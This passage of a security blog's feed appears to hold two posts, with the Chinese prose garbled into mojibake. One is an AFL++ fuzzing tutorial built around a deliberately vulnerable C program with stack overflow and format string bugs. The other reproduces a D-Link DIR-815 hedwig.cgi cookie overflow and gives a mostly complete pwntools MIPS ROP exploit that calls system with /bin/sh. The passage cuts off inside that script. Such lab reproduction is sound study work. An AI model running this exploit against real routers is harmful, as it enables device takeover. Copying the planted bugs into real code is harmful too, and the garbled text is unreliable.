href="https://xz.aliyun.com/t/4314?time__1311=n4+xnD0D9DgDcBQKDtD/ia4BK+bxIxiIo2t4x#toc-3">åˆæ¢AFL-Fuzz - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//å¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²çš„é¦–å­—ç¬¦ä¸ºAå¹¶ä¸”é•¿åº¦ä¸º66ï¼Œåˆ™å¼‚å¸¸é€€å‡º</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//å¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²çš„é¦–å­—ç¬¦ä¸ºFå¹¶ä¸”é•¿åº¦ä¸º6ï¼Œåˆ™å¼‚å¸¸é€€å‡º</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æœ‰æºç çš„fuzz"><a href="#æœ‰æºç çš„fuzz" class="headerlink" title="æœ‰æºç çš„fuzz"></a>æœ‰æºç çš„fuzz</h3><p>é¦–å…ˆæ˜¯ç¼–è¯‘å™¨çš„é€‰æ‹©<a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#a-selecting-the-best-afl-compiler-for-instrumenting-the-target">å®˜æ–¹æ–‡æ¡£</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-clang-lto ./afl_test.c -o afl_test</span><br></pre></td></tr></table></figure><p>å¯¹é‚£äº›å¯ä»¥ç›´æ¥ä»stdinè¯»å–è¾“å…¥çš„ç›®æ ‡ç¨‹åºæ¥è¯´ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š<br><code>./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [â€¦paramsâ€¦]</code><br>å¯¹ä»æ–‡ä»¶è¯»å–è¾“å…¥çš„ç›®æ ‡ç¨‹åºæ¥è¯´ï¼Œè¦ç”¨â€œ@@â€ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š<br><code>./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i fuzz_in -o fuzz_out ./afl_test</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405260110406.png" alt="image-20240526003227700"></p><p>è¿™æ ·ä¸‰ä¸ªåŒºåŸŸè¦æ³¨æ„çš„</p><p>process time,overall result,findings in depth</p><p>ä¸»è¦æ˜¯total crasheså¯ä»¥çœ‹åˆ°å‡ ä¸ªè¢«ä¿ç•™ï¼Œå…ˆçŸ¥ç¤¾åŒºé‚£ç¯‡AFLä¾¿æœ‰ç»†è®²</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bamboo@bamboo-virtual-machine:~/test/fuzz_out/default/crashes$ xxd id:000000,sig:11,src:000002,time:525,execs:641,op:havoc,rep:2</span><br><span class="line">00000000: 4646 ff61 6161                           FF.aaa           //å¼‚å¸¸</span><br><span class="line">bamboo@bamboo-virtual-machine:~/test/fuzz_out/default/crashes$ xxd id:000001,sig:11,src:000002,time:2133,execs:2603,op:havoc,rep:30</span><br><span class="line">00000000: cfcf cfcf cfcf cfcf cfcf cfcf cfcf cfcf  ................</span><br><span class="line">00000010: cfcf cfcf cfcf cfff 80b2 b2b2 b2b2 b2b2  ................</span><br><span class="line">00000020: b2b2 b2b2 b2b2 b2b2 b2b2 b2b2 b2b2 b2b2  ................</span><br><span class="line">00000030: b2b2 b2b2 4db2 b2b2 b2b2 b2b2 b2cf cfcf  ....M...........</span><br><span class="line">00000040: cfcf cfcf cfcf ff80 9eb2 b2b2 b2b2 b2cf  ................</span><br><span class="line">00000050: cfcf cfcf cfcf cfcf cfcf cfcf cfcf cfcf  ................</span><br><span class="line">00000060: d4cf cf80 b2cf 0064 e2cf cfcf cfcf ff80  .......d........</span><br><span class="line">00000070: 9eb2 97b2 b2b2 b2cf cfcf cfcf cfcf cfcf  ................</span><br><span class="line">00000080: cfcf cfcf b2b2 b2b2 b2b2 9db2 b2b2 b2e6  ................</span><br><span class="line">00000090: ddff                                     ..</span><br><span class="line">bamboo@bamboo-virtual-machine:~/test/fuzz_out/default/crashes$ xxd id:000002,sig:11,src:000002,time:7445,execs:10000,op:havoc,rep:2</span><br><span class="line">00000000: 256e 6161                                %naa              //æ ¼å¼åŒ–å­—ç¬¦ä¸²</span><br><span class="line">bamboo@bamboo-virtual-machine:~/test/fuzz_out/default/crashes$ xxd id:000003,sig:11,src:000001,time:11633,execs:15043,op:havoc,rep:63</span><br><span class="line">00000000: 417f 418e 4141 be41 4141 4141 4140 4129  A.A.AA.AAAAAA@A)</span><br><span class="line">00000010: 4141 4180 4120 415a 5a41 6241 4141 4141  AAA.A AZZAbAAAAA</span><br><span class="line">00000020: 4102 4120 415a 5a3b 3241 4141 4141 4141  A.A AZZ<span class="comment">;2AAAAAAA</span></span><br><span class="line">00000030: 4141 4141 4141 4141 4141 7f36 4141 4141  AAAAAAAAAA.6AAAA</span><br><span class="line">00000040: 4141 0200 4140 4129 4141 4180 4120 415a  AA..A@A)AAA.A AZ</span><br><span class="line">00000050: 5a41 6241 3041 4141 4102 4120 415a 5a3b  ZAbA0AAAA.A AZZ<span class="comment">;</span></span><br><span class="line">00000060: 3241 4140 4141 0241 2041 5a5a 4162 4149  2AA@AA.A AZZAbAI</span><br><span class="line">00000070: 4141 4141 0241 df41 5a5a 4132 4141 4141  AAAA.A.AZZA2AAAA</span><br><span class="line">00000080: 4141 0241 2041 5a64 4141 4100 4041 4100  AA.A AZdAAA.@AA.</span><br><span class="line">00000090: 1b                                       .</span><br><span class="line">bamboo@bamboo-virtual-machine:~/test/fuzz_out/default/crashes$ xxd id:000004,sig:11,src:000001,time:25097,execs:31270,op:havoc,rep:28    //å¼‚å¸¸2ï¼Œä¸è¿‡\x00</span><br><span class="line">00000000: 4197 8241 1f87 a4a4 c87f ffc8 c8c8 afaf  A..A............</span><br><span class="line">00000010: af8e afaf afaf afaf afaf 98d8 9898 9898  ................</span><br><span class="line">00000020: 98b8 9897 9898 8e98 9898 9898 9898 9898  ................</span><br><span class="line">00000030: 9898 9898 9898 98af afaf afaf afaf c821  ...............!</span><br><span class="line">00000040: 8820 0000 0002 0003 2017 c8c8 1c         . ...... ....</span><br></pre></td></tr></table></figure><ol><li><strong>id:000001</strong>:<ul><li>è¿™æ˜¯ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œç”¨äºæ ‡è¯† AFL++ ç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹ã€‚æ¯ä¸ªæ–°ç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹éƒ½ä¼šæœ‰ä¸€ä¸ªé€’å¢çš„ IDã€‚</li></ul></li><li><strong>sig:11</strong>:<ul><li>è¿™æ˜¯ä¿¡å·ç¼–å·ï¼Œè¡¨ç¤ºç¨‹åºå´©æºƒæ—¶æ¥æ”¶åˆ°çš„ä¿¡å·ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>11</code> è¡¨ç¤º <code>SIGSEGV</code>ï¼ˆSegmentation Faultï¼‰ï¼Œå³å†…å­˜è®¿é—®è¿è§„ã€‚</li></ul></li><li><strong>src:000002</strong>:<ul><li>è¿™æ˜¯ç”Ÿæˆè¯¥æµ‹è¯•ç”¨ä¾‹çš„çˆ¶æµ‹è¯•ç”¨ä¾‹çš„ IDã€‚å®ƒè¡¨ç¤ºæ­¤æµ‹è¯•ç”¨ä¾‹æ˜¯ä» ID ä¸º <code>000002</code> çš„æµ‹è¯•ç”¨ä¾‹å˜å¼‚è€Œæ¥çš„ã€‚</li></ul></li><li><strong>time:2133</strong>:<ul><li>è¿™æ˜¯ AFL++ ç”Ÿæˆè¯¥æµ‹è¯•ç”¨ä¾‹æ—¶çš„è¿è¡Œæ—¶é—´ï¼Œå•ä½æ˜¯æ¯«ç§’ã€‚è¿™é‡Œè¡¨ç¤º AFL++ åœ¨è¿è¡Œ 2133 æ¯«ç§’åç”Ÿæˆäº†è¿™ä¸ªæµ‹è¯•ç”¨ä¾‹ã€‚</li></ul></li><li><strong>execs:2603</strong>:<ul><li>è¿™æ˜¯ AFL++ åœ¨ç”Ÿæˆè¯¥æµ‹è¯•ç”¨ä¾‹æ—¶çš„æ‰§è¡Œæ¬¡æ•°ã€‚è¡¨ç¤º AFL++ å·²ç»æ‰§è¡Œäº† 2603 æ¬¡æµ‹è¯•ç”¨ä¾‹ã€‚</li></ul></li><li><strong>op:havoc</strong>:<ul><li>è¿™æ˜¯ AFL++ ç”¨æ¥ç”Ÿæˆè¯¥æµ‹è¯•ç”¨ä¾‹çš„å˜å¼‚æ“ä½œç±»å‹ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>havoc</code> æ˜¯ä¸€ç§éšæœºå˜å¼‚ç­–ç•¥ï¼ŒAFL++ ä¼šå¯¹è¾“å…¥è¿›è¡Œå¤šç§éšæœºå˜å¼‚æ“ä½œï¼Œä»¥å‘ç°æ½œåœ¨çš„æ¼æ´ã€‚</li></ul></li><li><strong>rep:30</strong>:<ul><li>è¿™æ˜¯ AFL++ åœ¨ç”Ÿæˆè¯¥æµ‹è¯•ç”¨ä¾‹æ—¶é‡å¤å˜å¼‚æ“ä½œçš„æ¬¡æ•°ã€‚è¡¨ç¤ºè¯¥æµ‹è¯•ç”¨ä¾‹æ˜¯åœ¨ç¬¬ 30 æ¬¡å˜å¼‚æ“ä½œæ—¶ç”Ÿæˆçš„ã€‚</li></ul></li></ol><p>çœ‹æ¥é‡Œé¢è¿˜æ˜¯æœ‰å¾ˆå¤šé—¨é“çš„ï¼Œå¸Œæœ›æˆ‘æœ‰ä¸€å¤©èƒ½å‚é€</p><h3 id="æ— æºç çš„fuzz"><a href="#æ— æºç çš„fuzz" class="headerlink" title="æ— æºç çš„fuzz"></a>æ— æºç çš„fuzz</h3><p>æ— æºç çš„è¦åœ¨qemuä¸Šè¿è¡Œï¼Œç¡®ä¿äº‹å…ˆè£…å¥½systemå’Œstaticçš„qemu</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> qemu_mode</span><br><span class="line">./build_qemu_support.sh</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o afl_test2 afl_test.c</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i <span class="keyword">in</span> -o out -Q ./afl_test2</span><br></pre></td></tr></table></figure><p>-Qè¯´æ˜æ˜¯qemuè¿è¡Œ</p><p>ä¹‹åå°è¯•ä¸€äº›ctfï¼Œiotä¸Šçš„åº”ç”¨ï¼ˆç®—æ˜¯ç•™ä¸ªå‘ï¼‰ï¼Œå…¶å®æˆ‘å°è¯•äº†goçš„ä½†æ˜¯è·‘çš„å¾ˆæ…¢å¾ˆæ…¢ï¼Œç­‰æˆ‘æœ‰æœåŠ¡å™¨äº†å†ç”¨æœåŠ¡å™¨è·‘ï¼ˆå¬è¯´è·‘fuzzçƒ§ç¡¬ç›˜</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;çœ‹ç½‘ä¸Šçš„è¯„ä»·fuzzå¥½åƒæ˜¯æŒ–æ¼æ´çš„é¦–é€‰å·¥å…·ï¼Œå°±å…ˆæµ…æµ…å­¦ä¹ ä¸€ä¸‹ï¼Œæˆ–è®¸å¯ä»¥æ‰¾æ‰¾ctfçš„åº”ç”¨åœºæ™¯ï¼Œå…ˆä»AFL++å¼€å§‹&lt;/p&gt;
&lt;h2 id=&quot;å®‰è£…&quot;&gt;&lt;a href=&quot;#å®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…&quot;&gt;&lt;/a&gt;å®‰è£…&lt;/h2&gt;&lt;p&gt;åœ¨å®‰è£…ä¹‹å‰AF</summary>
      
    
    
    
    
    <category term="Fuzz" scheme="http://s1nec-1o.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>DIR-815æ¼æ´å¤ç°</title>
    <link href="http://s1nec-1o.github.io/2024/05/21/DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/05/21/DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-05-21T14:21:25.000Z</published>
    <updated>2024-05-21T14:25:22.997Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DIR-815"><a href="#DIR-815" class="headerlink" title="DIR-815"></a>DIR-815</h1><p>ä»”ç»†ç ”è¯»äº†winmtå¸ˆå‚…å’ŒZIKH26å¸ˆå‚…çš„å¤ç°ï¼Œç°åœ¨è‡ªå·±æ¥å¤ç°ä¸€é</p><h2 id="æ¼æ´è¯¦æƒ…"><a href="#æ¼æ´è¯¦æƒ…" class="headerlink" title="æ¼æ´è¯¦æƒ…"></a>æ¼æ´è¯¦æƒ…</h2><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223733.png" alt="image-20240425225544242" style="zoom:50%;" /><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><p>è¯¥éƒ¨åˆ†å¯ä»¥çœ‹<a href="https://zikh26.github.io/posts/d1f081a9.html">ZIKH26å¸ˆå‚…çš„blog</a>ï¼ŒåŸæœ¬æ˜¯æƒ³åœ¨å¸ˆå‚…çš„åˆ†æä¸Šè¡¥å……çš„ï¼Œä½†æ˜¯äº‹æƒ…å¤ªå¤šäº†ï¼Œæœ€åçœ‹çš„è„‘å­ç–¼ï¼Œåªèƒ½æš‚ä¸”æç½®äº†</p><h2 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h2><h3 id="ç¡®è®¤libc-base"><a href="#ç¡®è®¤libc-base" class="headerlink" title="ç¡®è®¤libc_base"></a>ç¡®è®¤libc_base</h3><p>ç”±äºè¯¥gdbæ˜¯é“¾æ¥åœ¨qemuæ¨¡å¼ä¸‹çš„ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥é€šè¿‡vmmapå¾—åˆ°libcåŸºå€ï¼Œè€Œç›´æ¥libcåˆå› ä¸ºæƒé™ä¸è¶³æ— æ³•ä½¿ç”¨ï¼Œåˆå› ä¸º<strong>è¿™ä¸ªè·¯ç”±è®¾å¤‡çš„çœŸæœºå°±æ˜¯æ²¡æœ‰å¼€åœ°å€éšæœºåŒ–çš„</strong>ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦**é€šè¿‡æ‰¾ä¸€ä¸ª<code>libc</code>å‡½æ•°åœ°å€å‡å»åç§»æ¥å¾—åˆ°<code>libc_base</code>**ï¼Œè€Œå› ä¸ºâ€œå»¶è¿Ÿç»‘å®šçš„ç‰¹æ€§â€ï¼Œè¦æ‰¾ä¸¤ä¸ªä½¿ç”¨libcå‡½æ•°çš„åœ°å€</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223735.png" alt="image-20240422235933593" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223736.png" alt="image-20240423000016590" style="zoom: 50%;" /><p>å¯ä»¥å¾—åˆ°memsetçš„åœ°å€åœ¨0x7f76ca20</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223737.png" alt="image-20240423000125429"></p><p>å¯ä»¥å¾—åˆ°libc_base&#x3D;0x7f76ca20-0x034A20&#x3D;0x7F738000</p><h3 id="ç¡®è®¤æº¢å‡ºå¤§å°"><a href="#ç¡®è®¤æº¢å‡ºå¤§å°" class="headerlink" title="ç¡®è®¤æº¢å‡ºå¤§å°"></a>ç¡®è®¤æº¢å‡ºå¤§å°</h3><p>é¦–å…ˆï¼Œ<code>cyclic 2000 &gt; payload</code>ï¼Œå°†ç”Ÿæˆçš„<code>2000</code>ä¸ªå­—ç¬¦å­˜æ”¾åˆ°<code>payload</code>æ–‡ä»¶ä¸­ï¼Œå†ç”¨ä»¥ä¸‹<code>shell</code>è„šæœ¬ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"> </span><br><span class="line">INPUT=<span class="string">&quot;winmt=pwner&quot;</span></span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$INPUT</span>&quot;</span> | <span class="built_in">wc</span> -c)</span><br><span class="line">cookie=<span class="string">&quot;uid=`cat payload`&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INPUT</span> | qemu-mipsel -L ./ -0 <span class="string">&quot;hedwig.cgi&quot;</span> -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> -E HTTP_COOKIE=<span class="variable">$cookie</span> -E REQUEST_URI=<span class="string">&quot;2333&quot;</span> -g 1234 ./htdocs/cgibin</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223738.png" alt="image-20240423000624091" style="zoom:50%;" /><p>å¾—åˆ°äº†libc_baseå’Œæº¢å‡ºå¤§å°ï¼Œç°åœ¨å°±è¦å¯»æ‰¾å¯¹åº”çš„gadgetæ¥ææƒ</p><p>æ­¤æ—¶çš„å¯„å­˜å™¨ä¸º</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223739.png" alt="image-20240423194608538" style="zoom:50%;" /><p>å‘ç°S8æ°å¥½ä¸ºè¿”å›åœ°å€çš„ä¸Šä¸€ä½ï¼ŒS7ï¼ŒS6ç›´åˆ°S0é€æ¸é€’å‡ï¼Œå› æ­¤å¯ä»¥æ§åˆ¶S0-S8ä»¥æ­¤æ„é€ ROPé“¾</p><h2 id="qemuç”¨æˆ·æ¨¡å¼å¤ç°"><a href="#qemuç”¨æˆ·æ¨¡å¼å¤ç°" class="headerlink" title="qemuç”¨æˆ·æ¨¡å¼å¤ç°"></a>qemuç”¨æˆ·æ¨¡å¼å¤ç°</h2><h3 id="å¯»æ‰¾ROPgadget"><a href="#å¯»æ‰¾ROPgadget" class="headerlink" title="å¯»æ‰¾ROPgadget"></a>å¯»æ‰¾ROPgadget</h3><h4 id="å¤ä¹ ä¸€ä¸‹gadgetçš„å¯»æ‰¾"><a href="#å¤ä¹ ä¸€ä¸‹gadgetçš„å¯»æ‰¾" class="headerlink" title="å¤ä¹ ä¸€ä¸‹gadgetçš„å¯»æ‰¾"></a>å¤ä¹ ä¸€ä¸‹gadgetçš„å¯»æ‰¾</h4><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223740.png" alt="image-20240423185734832" style="zoom: 33%;" /><p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯$v0ä¸ºå‡½æ•°è¿”å›å€¼å­˜æ”¾çš„å¯„å­˜å™¨ï¼Œ$raå­˜åœ¨è¿”å›åœ°å€ï¼Œ$a0-$a3å­˜åœ¨å‡½æ•°çš„å››ä¸ªè°ƒç”¨å‚æ•°ï¼Œå½“éœ€è¦ä½¿ç”¨æ›´å¤šçš„å¯„å­˜å™¨æ—¶ï¼Œå°±éœ€è¦å †æ ˆï¼ˆstack)äº†,éœ€è¦æ³¨æ„çš„æ˜¯MIPSç¼–è¯‘å™¨æ€»æ˜¯ä¸ºå‚æ•°åœ¨å †æ ˆä¸­ç•™æœ‰ç©ºé—´ä»¥é˜²æœ‰å‚æ•°éœ€è¦å­˜å‚¨ã€‚</p><p>å› æ­¤å¯¹äºä½¿ç”¨ROPè¿›è¡Œä¸€èˆ¬çš„å‡½æ•°æ“ä½œæ¥è¯´ï¼Œå¯„å­˜å™¨çš„å››ä¸ªå‚æ•°å·²ç»è¶³å¤Ÿäº†ï¼Œå› æ­¤æ§åˆ¶è¿™ä¸ªå››ä¸ªå¯„å­˜å™¨å¯¹äºROPæ¥è¯´æ¯”è¾ƒå…³é”®ã€‚</p><p>åœ¨uclibcåº“ä¸­ï¼Œæœ‰å‡ ä¸ªæ¯”è¾ƒå…³é”®çš„gadgetï¼Œåœ¨<code>scandir</code>çš„å°¾éƒ¨æˆ–è€…<code>scandir64</code>çš„å°¾éƒ¨ï¼Œä»å›¾ä¸Šçœ‹åŸºæœ¬ä¸Šå¯ä»¥è®¾ç½®æ‰€æœ‰å¯„å­˜å™¨å€¼ï¼Œä»s0-s7</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223741.png" alt="image-20240423185850706" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223742.png" alt="image-20240423185927880" style="zoom:50%;" /><p>æœ‰ä¸€æ¡æ¯”è¾ƒå¸¸è§„çš„ROPé“¾ï¼Œæ‰§è¡Œçš„æ•´ä½“æµç¨‹ä¸º sleep(1) -&gt; read_value_from_stack -&gt; jump to stack(shellcode)</p><h4 id="å¸ƒç½®ROPé“¾"><a href="#å¸ƒç½®ROPé“¾" class="headerlink" title="å¸ƒç½®ROPé“¾"></a>å¸ƒç½®ROPé“¾</h4><p><code>system</code>åœ°å€æœ«ä¸¤ä½æ˜¯<code>\x00</code>ï¼Œè€Œ<code>sprintf</code>ä¼šè¢«<code>\x00</code>æˆªæ–­ï¼Œå› æ­¤è¿™é‡Œé‡‡ç”¨çš„æ–¹æ³•æ˜¯ï¼š<strong>è¯»è¿›å»<code>system_addr - 1</code>ï¼Œå†æ‰¾åˆ°<code>addiu ..., 1</code>çš„<code>gadget</code>å¯¹å…¶æ“ä½œåå†è·³è½¬è¿‡å»</strong>ã€‚</p><p>å› æ­¤å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x7F738000</span></span><br><span class="line"><span class="comment">#prepare:</span></span><br><span class="line"><span class="comment">#0x000158C8  |  addiu $s0,1  |  jalr  $s5 </span></span><br><span class="line"><span class="comment">#0x00015B74  |  move $a0,$s2 |  jalr  $s0  </span></span><br><span class="line"></span><br><span class="line">payload=<span class="number">973</span>*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x53200</span>-<span class="number">1</span>)        <span class="comment">#s0 system-1</span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s1</span></span><br><span class="line">payload+=p32(libc_base+ <span class="number">0x6DFD0</span>)         <span class="comment">#s2 /bin/sh</span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s3</span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s4 </span></span><br><span class="line">payload+=p32(libc_base+ <span class="number">0x15B74</span>)         <span class="comment">#s5 move $a0,$s2 |  jalr  $s0                   </span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s6</span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s7 </span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s8  </span></span><br><span class="line">payload+=p32(libc_base + <span class="number">0x000158C8</span>)     <span class="comment">#ra addiu $s0,1  |  jalr  $s5 </span></span><br><span class="line">payload=<span class="string">b&#x27;uid=&#x27;</span> + payload</span><br><span class="line"></span><br><span class="line">post_content=<span class="string">b&#x27;s1nec-1o=pwnner&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=11 